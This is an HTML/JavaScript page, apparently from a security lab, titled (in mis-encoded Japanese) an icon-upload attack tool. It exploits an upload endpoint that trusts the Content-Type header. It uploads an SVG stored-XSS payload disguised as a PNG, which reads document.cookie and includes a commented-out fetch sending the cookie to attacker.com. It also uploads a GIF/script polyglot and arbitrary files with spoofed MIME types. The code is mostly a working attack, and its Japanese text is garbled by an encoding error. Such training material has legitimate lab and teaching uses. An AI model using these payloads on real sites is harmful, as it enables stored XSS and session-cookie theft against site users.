<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ”»æ’ƒãƒ„ãƒ¼ãƒ«</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #d32f2f;
            border-bottom: 3px solid #d32f2f;
            padding-bottom: 10px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .attack-section {
            margin: 30px 0;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 5px;
            border-left: 4px solid #667eea;
        }
        .attack-section h2 {
            color: #667eea;
            margin-top: 0;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
            transition: background 0.3s;
        }
        button:hover {
            background: #5568d3;
        }
        button.danger {
            background: #d32f2f;
        }
        button.danger:hover {
            background: #b71c1c;
        }
        .result {
            margin-top: 15px;
            padding: 15px;
            border-radius: 5px;
            background: #e8f5e9;
            border: 1px solid #4caf50;
            display: none;
        }
        .result.error {
            background: #ffebee;
            border-color: #f44336;
        }
        .result.show {
            display: block;
        }
        pre {
            background: #263238;
            color: #aed581;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-size: 14px;
        }
        .file-input-wrapper {
            margin: 15px 0;
        }
        .file-input-wrapper input[type="file"] {
            margin: 10px 0;
        }
        .info {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 15px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ”“ ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ”»æ’ƒãƒ„ãƒ¼ãƒ«</h1>
        
        <div class="warning">
            <strong>âš ï¸ è­¦å‘Š:</strong> ã“ã®ãƒ„ãƒ¼ãƒ«ã¯æ•™è‚²ç›®çš„ã®ã¿ã§ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
            å®Ÿéš›ã®ã‚·ã‚¹ãƒ†ãƒ ã«å¯¾ã—ã¦è¨±å¯ãªãæ”»æ’ƒã‚’è¡Œã†ã“ã¨ã¯é•æ³•ã§ã™ã€‚
        </div>

        <div class="info">
            <h3>è„†å¼±æ€§ã®èª¬æ˜</h3>
            <p>ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ©Ÿèƒ½ï¼ˆ<code>/api/upload-icon</code>ï¼‰ã«ã¯ä»¥ä¸‹ã®è„†å¼±æ€§ãŒã‚ã‚Šã¾ã™ï¼š</p>
            <ul>
                <li>MIMEã‚¿ã‚¤ãƒ—ã®ã¿ã®æ¤œè¨¼ï¼ˆå®Ÿéš›ã®ãƒ•ã‚¡ã‚¤ãƒ«å†…å®¹ã‚’æ¤œè¨¼ã—ã¦ã„ãªã„ï¼‰</li>
                <li>Content-Typeãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãã®ã¾ã¾ä¿¡é ¼ã—ã¦ã„ã‚‹</li>
                <li>ãƒ•ã‚¡ã‚¤ãƒ«æ‹¡å¼µå­ã¨å®Ÿéš›ã®ãƒ•ã‚¡ã‚¤ãƒ«å†…å®¹ã®ä¸€è‡´ã‚’ç¢ºèªã—ã¦ã„ãªã„</li>
            </ul>
        </div>

        <!-- XSSæ”»æ’ƒã‚»ã‚¯ã‚·ãƒ§ãƒ³ -->
        <div class="attack-section">
            <h2>æ”»æ’ƒ1: XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€SVGãƒ•ã‚¡ã‚¤ãƒ«</h2>
            <p>SVGãƒ•ã‚¡ã‚¤ãƒ«ã«JavaScriptã‚³ãƒ¼ãƒ‰ã‚’åŸ‹ã‚è¾¼ã¿ã€ã‚¢ã‚¤ã‚³ãƒ³è¡¨ç¤ºæ™‚ã«å®Ÿè¡Œã•ã›ã¾ã™ã€‚</p>
            <button onclick="uploadXSSPayload()">XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰</button>
            <div id="xss-result" class="result"></div>
        </div>

        <!-- ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«æ”»æ’ƒã‚»ã‚¯ã‚·ãƒ§ãƒ³ -->
        <div class="attack-section">
            <h2>æ”»æ’ƒ2: ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆGIF + ã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼‰</h2>
            <p>GIFãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦ã‚‚æœ‰åŠ¹ã ãŒã€åŒæ™‚ã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚³ãƒ¼ãƒ‰ã‚‚å«ã‚€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚</p>
            <button onclick="uploadPolyglotFile()">ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰</button>
            <div id="polyglot-result" class="result"></div>
        </div>

        <!-- ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ -->
        <div class="attack-section">
            <h2>æ”»æ’ƒ3: ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰</h2>
            <p>ç‹¬è‡ªã®æ”»æ’ƒãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ï¼ˆContent-Typeã‚’å½è£…å¯èƒ½ï¼‰ã€‚</p>
            <div class="file-input-wrapper">
                <input type="file" id="customFile" accept="*/*">
                <label for="mimeType">MIMEã‚¿ã‚¤ãƒ—:</label>
                <select id="mimeType">
                    <option value="image/png">image/png</option>
                    <option value="image/jpeg">image/jpeg</option>
                    <option value="image/gif">image/gif</option>
                    <option value="image/webp">image/webp</option>
                </select>
            </div>
            <button onclick="uploadCustomFile()">ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰</button>
            <div id="custom-result" class="result"></div>
        </div>

        <!-- ç¾åœ¨ã®ã‚¢ã‚¤ã‚³ãƒ³ç¢ºèª -->
        <div class="attack-section">
            <h2>ç¾åœ¨ã®ã‚¢ã‚¤ã‚³ãƒ³ç¢ºèª</h2>
            <button onclick="checkCurrentIcon()">ç¾åœ¨ã®ã‚¢ã‚¤ã‚³ãƒ³ã‚’ç¢ºèª</button>
            <div id="check-result" class="result"></div>
        </div>
    </div>

    <script>
        // XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€SVGãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
        async function uploadXSSPayload() {
            const resultDiv = document.getElementById('xss-result');
            resultDiv.className = 'result';
            resultDiv.textContent = 'ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ä¸­...';

            const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <text x="50" y="55" text-anchor="middle" fill="white" font-size="20">XSS</text>
  <script type="text/javascript">
    alert('XSSæ”»æ’ƒæˆåŠŸï¼ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã—ãŸã€‚');
    console.log('Session:', document.cookie);
    // ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’å¤–éƒ¨ã«é€ä¿¡ï¼ˆå®Ÿéš›ã®æ”»æ’ƒã§ã¯ï¼‰
    // fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
  </script>
</svg>`;

            const blob = new Blob([svgContent], { type: 'image/png' });
            const file = new File([blob], 'icon.png', { type: 'image/png' });

            await uploadFile(file, resultDiv);
        }

        // ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
        async function uploadPolyglotFile() {
            const resultDiv = document.getElementById('polyglot-result');
            resultDiv.className = 'result';
            resultDiv.textContent = 'ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ä¸­...';

            // GIFãƒã‚¸ãƒƒã‚¯ãƒŠãƒ³ãƒãƒ¼ï¼ˆGIF89aï¼‰ã§å§‹ã¾ã‚‹ãŒã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚³ãƒ¼ãƒ‰ã‚‚å«ã‚€
            const polyglotContent = `GIF89a
<!-- ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«: GIFã¨ã—ã¦ã‚‚æœ‰åŠ¹ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¨ã—ã¦ã‚‚å®Ÿè¡Œå¯èƒ½ -->
<script>
  // ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ç”»åƒã¨ã—ã¦è¡¨ç¤ºã•ã‚Œã‚‹éš›ã«å®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹
  console.log('ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒå®Ÿè¡Œã•ã‚Œã¾ã—ãŸ');
  alert('ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«æ”»æ’ƒæˆåŠŸï¼');
</script>
<!-- å®Ÿéš›ã®GIFãƒ‡ãƒ¼ã‚¿ã¯ã“ã“ã«ç¶šã -->`;

            const blob = new Blob([polyglotContent], { type: 'image/gif' });
            const file = new File([blob], 'icon.gif', { type: 'image/gif' });

            await uploadFile(file, resultDiv);
        }

        // ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
        async function uploadCustomFile() {
            const resultDiv = document.getElementById('custom-result');
            const fileInput = document.getElementById('customFile');
            const mimeType = document.getElementById('mimeType').value;

            if (!fileInput.files[0]) {
                resultDiv.className = 'result error show';
                resultDiv.textContent = 'ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é¸æŠã—ã¦ãã ã•ã„ã€‚';
                return;
            }

            resultDiv.className = 'result';
            resultDiv.textContent = 'ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ä¸­...';

            // é¸æŠã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚“ã§ã€MIMEã‚¿ã‚¤ãƒ—ã‚’å½è£…
            const originalFile = fileInput.files[0];
            const fileContent = await originalFile.arrayBuffer();
            const blob = new Blob([fileContent], { type: mimeType });
            const file = new File([blob], originalFile.name, { type: mimeType });

            await uploadFile(file, resultDiv);
        }

        // ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹å…±é€šé–¢æ•°
        async function uploadFile(file, resultDiv) {
            const formData = new FormData();
            formData.append('icon', file);

            try {
                const response = await fetch('/api/upload-icon', {
                    method: 'POST',
                    body: formData,
                    credentials: 'include'
                });

                const result = await response.json();
                
                if (result.success) {
                    resultDiv.className = 'result show';
                    resultDiv.innerHTML = `
                        <strong>âœ… ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æˆåŠŸï¼</strong><br>
                        ã‚¢ã‚¤ã‚³ãƒ³ãƒ‘ã‚¹: <code>${result.iconPath}</code><br>
                        <a href="${result.iconPath}" target="_blank">ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¡¨ç¤º</a>
                    `;
                } else {
                    resultDiv.className = 'result error show';
                    resultDiv.textContent = `âŒ ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰å¤±æ•—: ${result.message || 'ä¸æ˜ãªã‚¨ãƒ©ãƒ¼'}`;
                }
            } catch (error) {
                resultDiv.className = 'result error show';
                resultDiv.textContent = `âŒ ã‚¨ãƒ©ãƒ¼: ${error.message}`;
            }
        }

        // ç¾åœ¨ã®ã‚¢ã‚¤ã‚³ãƒ³ã‚’ç¢ºèª
        async function checkCurrentIcon() {
            const resultDiv = document.getElementById('check-result');
            resultDiv.className = 'result';
            resultDiv.textContent = 'ç¢ºèªä¸­...';

            try {
                const response = await fetch('/session-check', {
                    credentials: 'include'
                });
                const sessionData = await response.json();

                if (sessionData.loggedIn && sessionData.userid) {
                    const iconResponse = await fetch(`/api/user-icon/${sessionData.userid}`, {
                        credentials: 'include'
                    });
                    const iconData = await iconResponse.json();

                    resultDiv.className = 'result show';
                    resultDiv.innerHTML = `
                        <strong>ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±:</strong><br>
                        ãƒ¦ãƒ¼ã‚¶ãƒ¼ID: <code>${sessionData.userid}</code><br>
                        ãƒ¦ãƒ¼ã‚¶ãƒ¼å: <code>${sessionData.username || 'N/A'}</code><br>
                        ã‚¢ã‚¤ã‚³ãƒ³ãƒ‘ã‚¹: <code>${iconData.iconPath || 'ãªã—'}</code><br>
                        ${iconData.iconPath ? `<img src="${iconData.iconPath}" style="max-width: 100px; margin-top: 10px;" alt="ã‚¢ã‚¤ã‚³ãƒ³">` : ''}
                    `;
                } else {
                    resultDiv.className = 'result error show';
                    resultDiv.textContent = 'âŒ ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã¾ã›ã‚“ã€‚';
                }
            } catch (error) {
                resultDiv.className = 'result error show';
                resultDiv.textContent = `âŒ ã‚¨ãƒ©ãƒ¼: ${error.message}`;
            }
        }
    </script>
</body>
</html>


